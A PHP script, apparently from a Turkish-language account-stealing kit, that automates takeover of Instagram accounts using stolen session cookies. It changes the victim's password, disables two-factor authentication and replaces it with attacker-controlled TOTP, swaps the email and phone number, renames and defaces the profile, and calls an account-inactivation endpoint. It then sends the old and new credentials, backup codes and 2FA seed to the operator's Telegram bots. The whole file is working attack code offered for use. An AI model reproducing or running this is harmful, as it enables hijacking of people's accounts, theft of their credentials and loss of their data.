<?php

set_time_limit(0);

require 'request.php';
require 'headers.php';
require 'encrypt.php';
require 'duoseed.php';
require 'telegram.php';

use App\Headers\HeadersList;
use App\Encrypt\encrypts;
use App\Request\Requests;


class s2s
{

    private $username;
    private $id;
    private $token;
    private $oldpassword;
    private $email;
    private $phone;
    private $fbid;
    private $logFile;
    private $headersList;
    private $enc;
    private $Requests;
    private $add_new_email;
    private $new_email_pass;
    private $target_device_id_uuid;
    private $target_device_id;
    private $new_password;
    private $new_token;
    private $erenseed;
    private $twocode;
    private $my_status;
    private $backup;
    private $follower_count;
    private $new_username;
    private $ppremove;

    public function __construct($username)
    {
        $cookie_path = "../cookies/$username.json";
        $cookie_data = $this->readCookie($cookie_path);

        $this->username = $username;
        $this->id = $cookie_data['id'];
        $this->token = $cookie_data['token'];
        $this->oldpassword = $cookie_data['password'];
        $this->email = $cookie_data['email'];
        $this->phone = $cookie_data['phone'];
        $this->fbid = $cookie_data['fbid'];

        $this->logFile = '../log/' . $username . '_log.txt';

        $this->headersList = new HeadersList();
        $this->enc = new encrypts();
        $this->Requests = new Requests();
    }

    public function readCookie($cookie_path)
    {
        $cookie_content = file_get_contents($cookie_path);
        $cookie_data = json_decode($cookie_content, true);
        return $cookie_data;
    }

    public function log($message, $endpoint)
    {
        $logMessage = $endpoint . " - " . $message . PHP_EOL;
        file_put_contents($this->logFile, $logMessage, FILE_APPEND);
    }

    public function domaingenerate()
    {
        $headers = [
            'accept: application/ld+json'
        ];

        return $this->Requests->RequestGETmail('domains?page=1', $headers);
    }

    public function accountgenerate($address = null, $password = 'mythicsikermapusyatar')
    {
        $headers = [
            'accept: application/ld+json',
            'Content-Type: application/ld+json'
        ];

        $post = [
            "address" => $address,
            "password" => $password
        ];

        return $this->Requests->RequestPOSTmail('accounts', $headers, $post);
    }


    public function devicesex()
    {

        $X_Ig_Android_Id = $this->headersList->X_Ig_Android_Id;

        $response = $this->Requests->RequestGETendpoint("session/login_activity/?device_id=$X_Ig_Android_Id", $this->headersList->appheaders($this->token, $this->id));

        $this->log('Device', $response, $this->username);

        if (!empty($response)) {
            $data = json_decode($response, true);
        }

        if (isset($data['sessions']) && is_array($data['sessions'])) {
            $sessions = $data['sessions'];
        } else {
            return;
        }

        $devices = [];

        foreach ($sessions as $session) {
            if (!empty($session['device_id']) && $session['device_id'] !== $X_Ig_Android_Id) {
                $devices[] = [
                    'device_id' => $session['device_id'],
                    'device_id_uuid' => $session['device_id_uuid']
                ];
            }
        }

        $successful_requests = [];

        foreach ($devices as $device) {

            $json = $this->domaingenerate();
            $decode = json_decode($json, true);
            $domain = $decode['hydra:member'][0]['domain'];
            $password = $this->enc->generateRandomPassword();
            $username = $this->enc->generateRandomusername();
            $address = $username . '@' . $domain;
            $this->accountgenerate($address, $password);

            $this->add_new_email = $address;
            $this->new_email_pass = $password;

            $post = [
                "phone_id" => $device['device_id_uuid'],
                "send_source" => "personal_information",
                "_uid" => $this->id,
                "guid" => $device['device_id_uuid'],
                "device_id" => $device['device_id'],
                "_uuid" => $device['device_id_uuid'],
                "email" => $this->add_new_email,
            ];

            $response = $this->Requests->RequestPostendpoint("accounts/send_confirm_email/", $this->headersList->targetheaders($this->token, $this->id, $device['device_id'], $device['device_id_uuid']), $post);

            if (!empty($response['body'])) {

                $this->log('send_confirm_email', $response['body'], $this->username);

                $response_data = json_decode($response['body'], true);
            }

            if (isset($response_data['status']) && $response_data['status'] === 'ok') {
                $successful_requests[] = $device;

                $this->target_device_id_uuid = $device['device_id_uuid'];
                $this->target_device_id = $device['device_id'];

                $json_data = json_encode($successful_requests);
                $this->log('Device', $json_data, $this->username);

                break;
            }
        }
    }


    public function passwordchange()
    {
        $newpassword = $this->enc->generateRandomPassword();
        $this->new_password = $newpassword;

        $post = [
            "_uid" => $this->id,
            "_uuid" => $this->target_device_id_uuid,
            "enc_old_password" => $this->enc->encrypt($this->oldpassword),
            "enc_new_password1" => $this->enc->encrypt($newpassword),
            "enc_new_password2" => $this->enc->encrypt($newpassword)
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/change_password/", $this->headersList->targetheaders($this->token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('PasswordChange', $response['body'], $this->username);

        $headers = $response['headers'];

        $headers = explode("\r\n", $headers);
        foreach ($headers as $header) {
            if (strpos($header, 'ig-set-authorization') !== false) {
                $bearer = trim(explode(':', $header, 2)[1]);
                preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                $this->new_token = $bearer;
            }
        }
    }


    public function disableduo()
    {
        $post = [
            "_uid" => $this->id,
            "device_id" => $this->target_device_id,
            "_uuid" => $this->target_device_id_uuid,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/disable_totp_two_factor/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/disable_totp_two_factor/', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }

    public function disablesms()
    {
        $post = [
            "_uid" => $this->id,
            "device_id" => $this->target_device_id,
            "_uuid" => $this->target_device_id_uuid,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/disable_sms_two_factor/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/disable_sms_two_factor/', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }


    public function seedgenerate()
    {
        $post = [
            "device_id" => $this->target_device_id,
            "_uuid" => $this->target_device_id_uuid,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/generate_two_factor_totp_key/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/generate_two_factor_totp_key/', $response['body'], $this->username);

        $decodedata = json_decode($response['body'], true);

        if (isset($decodedata['totp_seed'])) {

            $this->erenseed = $decodedata['totp_seed'];

            $codeGenerator = new MythicDuoSEED();
            $secret = $codeGenerator->createSecret($response['body']);
            $totpCode = $codeGenerator->getCode($secret);

            $this->twocode = $totpCode;
        }
    }

    public function two_enable()
    {
        $post = [
            "verification_code" => $this->twocode,
            "_uid" => $this->id,
            "device_id" => $this->target_device_id,
            "_uuid" => $this->target_device_id_uuid,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/enable_totp_two_factor/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/enable_totp_two_factor/', $response['body'], $this->username);

        $datas = json_decode($response['body'], true);

        if ($datas['status'] === 'ok') {
            $this->my_status = 'Hesap Sorunsuz Bir Şekilde Çekildi!';
        } else {
            $this->my_status = 'Hesap Çekilmedi, Kurucu Düştü Veya Sahibi Aktif Değil!';
        }

        $this->backup = $datas['backup_codes'][0] . " - " . $datas['backup_codes'][1] . " - " . $datas['backup_codes'][2] . " - " . $datas['backup_codes'][3];

        return [
            'body' => $response['body'],
        ];
    }

    public function floorep($sayi)
    {
        if ($sayi < 1000) {
            return $sayi;
        } elseif ($sayi < 10000) {
            return floor($sayi / 1000) . 'K';
        } elseif ($sayi < 1000000) {
            return floor($sayi / 1000) . 'K';
        } elseif ($sayi < 1000000000) {
            return floor($sayi / 1000000) . 'M';
        } else {
            return floor($sayi / 1000000000) . 'B';
        }
    }

    public function userinfo()
    {
        $İD = $this->id;

        $response = $this->Requests->RequestGETendpoint("users/$İD/info/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid));

        $this->log('users/mythic/info/', $response, $this->username);

        $data = json_decode($response, true);
        $followers = $data['user']['follower_count'];
        $followersmythic = $this->floorep($followers);
        $this->follower_count = $followersmythic;

        return [
            'body' => $response,
        ];
    }

    public function phonenumberdelete()
    {
        $post = [
            'primary_profile_link_type' => '0',
            'external_url' => '',
            'phone_number' => '+447531313131',
            'username' => $this->username,
            'show_fb_link_on_profile' => 'false',
            'first_name' => '',
            '_uid' => $this->id,
            'device_id' => $this->target_device_id,
            'biography' => '',
            '_uuid' => $this->target_device_id_uuid,
            'email' => $this->add_new_email
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/edit_profile/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/edit_profile/', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }


    public function numberdelete()
    {
        $post = [
            'primary_profile_link_type' => '0',
            'external_url' => '',
            'phone_number' => '+447531313131',
            'username' => $this->username,
            'show_fb_link_on_profile' => 'false',
            'first_name' => '',
            '_uid' => $this->id,
            'device_id' => $this->target_device_id,
            'biography' => '',
            '_uuid' => $this->target_device_id_uuid,
            'email' => $this->add_new_email
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/edit_profile/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/edit_profile/', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }


    public function usernamechange()
    {
        $this->new_username = $this->enc->generateRandomusername();
        $username = $this->new_username;
        $uuid = $this->target_device_id_uuid;
        $device_id = $this->target_device_id;

        $myfbid = $this->fbid;

        $post = [
            'params' => json_encode([
                "client_input_params" => [
                    "username" => "$username",
                    "family_device_id" => "$uuid",
                ],
                "server_params" => [
                    "INTERNAL__latency_qpl_instance_id" => 1.46709731000067E14,
                    "INTERNAL_INFRA_THEME" => "harm_f",
                    "machine_id" => null,
                    "identity_ids_DEPRECATED" => "$myfbid",
                    "operation_type" => "MUTATE",
                    "requested_screen_component_type" => 2,
                    "INTERNAL__latency_qpl_marker_id" => 36707139,
                ],
            ]),
            '_uuid' => $device_id,
            'bk_client_context' => json_encode([
                "bloks_version" => $this->headersList->X_Bloks_Version_Id,
                "styles_id" => "instagram",
            ]),
            'bloks_versioning_id' => $this->headersList->X_Bloks_Version_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("bloks/apps/com.bloks.www.fxim.settings.username.change.async/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('UsernameChange', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }


    public function devicechange()
    {

        $androidid = $this->target_device_id;
        $uuid = $this->target_device_id_uuid;

        $array = [
            'android' => $androidid,
            'uuid'    => $uuid
        ];

        $json_data = json_encode($array);

        $filename = dirname(__DIR__) . '/device' . '/' . $this->new_username . '.json';

        file_put_contents($filename, $json_data);
    }

    public function set_biography()
    {

        $post = [
            '_uid' => $this->id,
            'device_id' => $this->target_device_id,
            '_uuid' => $this->target_device_id_uuid,
            'raw_text' => 'Just Mytich / Samx, Gods flawed child',
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/set_biography/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), $post);

        $this->log('accounts/set_biography/', $response['body'], $this->username);

        return [
            'body' => $response['body'],
        ];
    }

    public function passwordfinish()
    {
        $headers = $this->headersList->appheaders($this->new_token, $this->id);
        $postdata = [
            "params" => json_encode([
                "client_input_params" => [
                    "family_device_id" => $this->headersList->X_Ig_Family_Device_Id,
                    "password" => $this->enc->encrypt($this->new_password),
                ],
                "server_params" => [
                    "caller_name" => "fx_settings_FXOnline_accounts_center_general",
                    "INTERNAL_INFRA_THEME" => "harm_f",
                    "INTERNAL__latency_qpl_instance_id" => "19991465929793599",
                    "wait_on_dismiss" => 0,
                    "machine_id" => null,
                    "account_type" => 1,
                    "requested_screen_component_type" => null,
                    "INTERNAL__latency_qpl_marker_id" => "36707139",
                    "account_id" => $this->fbid,
                ],
            ]),
            "_uuid" => $this->headersList->X_Ig_Device_Id,
            "bk_client_context" => json_encode([
                "bloks_version" => $this->headersList->X_Bloks_Version_Id,
                "styles_id" => "instagram",
            ]),
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
        ];

        $post = http_build_query($postdata);

        $response = $this->Requests->RequestPostnotendpoint("bloks/apps/com.bloks.www.fx.reauth.password.async/", $headers, $post);

        $this->log('passwordfinish', $response['body'], $this->username);

        return [
            'body' => $response,
        ];
    }

    public function deleteaccount()
    {
        $post = 'params={"client_input_params":{"ig_account_encrypted_auth_proof":"' . $this->new_token . '","device_id":"' . $this->headersList->X_Ig_Android_Id . '"},"server_params":{"INTERNAL__latency_qpl_instance_id":-1799780377,"INTERNAL_INFRA_THEME":"harm_f","username":"' . $this->new_username . '","identity_id":' . $this->fbid . ',"reason":"other","family_device_id":"' . $this->headersList->X_Ig_Family_Device_Id . '","is_deletion":1,"event_request_id":"2b5f93b5-abb5-4147-a081-15830882cd5f","INTERNAL__latency_qpl_marker_id":36707139}}&_uuid=' . $this->headersList->X_Ig_Device_Id . '&bk_client_context={"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a';

        $response = $this->Requests->RequestPostnotendpoint("bloks/apps/com.bloks.www.fx.settings.ig.inactivation.submit_finish/", $this->headersList->appheaders($this->new_token, $this->id), $post);

        $this->log('deleteaccount', $response['body'], $this->username);

        return [
            'body' => $response,
        ];
    }



    public function ppremove()
    {
        $post = [
            "_uid" => $this->id,
            "_uuid" => $this->target_device_id_uuid,
            "remove_birthday_selfie" => "False"
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/remove_profile_picture/", $this->headersList->targetheaders($this->new_token, $this->id,  $this->target_device_id, $this->target_device_id_uuid), http_build_query($post));
        $data = json_decode($response['body'], true);
        $this->log('PP Remove', $response['body'], $this->username);


        if ($data['status'] === 'ok') {
            $this->ppremove = 'Kaldırıldı!';
        } else {
            $this->ppremove = 'Kaldırılmadı Sorun Var!';
        }
        return [
            'body' => $response['body'],
        ];
    }


    public function telegram($token, $chatid)
    {

        global $token;
        global $chatid;


        $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

        $directory = dirname(__FILE__);
        $parentDirectory = dirname($directory);
        $grandParentDirectory = dirname($parentDirectory);
        $grandParentDirectoryName = basename($grandParentDirectory);

        $urls2s = $protocol . $domain . "/" . $grandParentDirectoryName . "/form/adminlogin.php";

        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        $data = array(
            'chat_id' => $chatid,
            'parse_mode' => 'markdown',
            'text' => "
     ⭐️ **Finish!** ⭐️

**Kullanıcı Adı:** `$this->username`
**Yeni Kullanıcı Adı:** `$this->new_username`

**Takipçi Sayısı:** `$this->follower_count`

**Eski E-Mail:** `$this->email`
**Eski Telefon Numarası:** `$this->phone`
**Eski Şifre:** `$this->oldpassword`

**Yeni Şifre:** `$this->new_password`
**Yeni E-Mail:** `$this->add_new_email`
**E-Mail Şifre:** `$this->new_email_pass`
**E-Mail Kutusu:** mail.tm
**Yeni Yedek Kodlar:** `$this->backup`
**Yeni Duo Mobile Key:** `$this->erenseed`
**Profil Resmi:** `$this->ppremove`
**Bilgi Değiştirme:** [Admin Panel]($urls2s)
**Tüm İşlemler:** `Finished!`

**Version:** `3.3 all created!`

**Status Account :** $this->my_status
"
        );
        $response = $this->Requests->requesttelegram($url, $data);
        return $response;
    }

    public function telegramowner($tokenowner, $chatidowner)
    {

        global $tokenowner;
        global $chatidowner;

        $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

        $directory = dirname(__FILE__);
        $parentDirectory = dirname($directory);
        $grandParentDirectory = dirname($parentDirectory);
        $grandParentDirectoryName = basename($grandParentDirectory);

        $urls2s = $protocol . $domain . "/" . $grandParentDirectoryName . "/form/adminlogin.php";

        $url = "https://api.telegram.org/bot{$tokenowner}/sendMessage";
        $data = array(
            'chat_id' => $chatidowner,
            'parse_mode' => 'markdown',
            'text' => "
      ⭐️ **Finish!** ⭐️

**Kullanıcı Adı:** `$this->username`
**Yeni Kullanıcı Adı:** `$this->new_username`

**Takipçi Sayısı:** `$this->follower_count`

**Eski E-Mail:** `$this->email`
**Eski Telefon Numarası:** `$this->phone`
**Eski Şifre:** `$this->oldpassword`

**Yeni Şifre:** `$this->new_password`
**Yeni E-Mail:** `$this->add_new_email`
**E-Mail Şifre:** `$this->new_email_pass`
**E-Mail Kutusu:** mail.tm
**Yeni Yedek Kodlar:** `$this->backup`
**Yeni Duo Mobile Key:** `$this->erenseed`
**Profil Resmi:** `$this->ppremove`
**Bilgi Değiştirme:** [Admin Panel]($urls2s)
**Tüm İşlemler:** `Finished!`

**Version:** `3.3 all created!`

Çekilen Site İD: `$grandParentDirectoryName`
"
        );
        $response = $this->Requests->requesttelegram($url, $data);
        return $response;
    }
}

$username = htmlspecialchars($_GET['username']);

$account = new s2s($username);

try {
    $devicesex = $account->devicesex();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $password = $account->passwordchange();
} catch (Exception $e) {
}

try {
    $disableduo = $account->disableduo();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $disablesms = $account->disablesms();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $phone = $account->phonenumberdelete();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $set_biography = $account->set_biography();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $seedgenerate = $account->seedgenerate();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $two_enable = $account->two_enable();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $userinfo = $account->userinfo();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $ppremove = $account->ppremove();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $usernamechange = $account->usernamechange();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $passwordfinish = $account->passwordfinish();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $deleteaccount = $account->deleteaccount();
} catch (Exception $e) {
    // Hata işleme
}

try {
    $telegram = $account->telegram($token, $chatid);
} catch (Exception $e) {
    // Hata işleme
}

try {
    $telegramowner = $account->telegramowner($tokenowner, $chatidowner);
} catch (Exception $e) {
    // Hata işleme
}
try {
    $telegramowner = $account->devicechange();
} catch (Exception $e) {
    // Hata işleme
}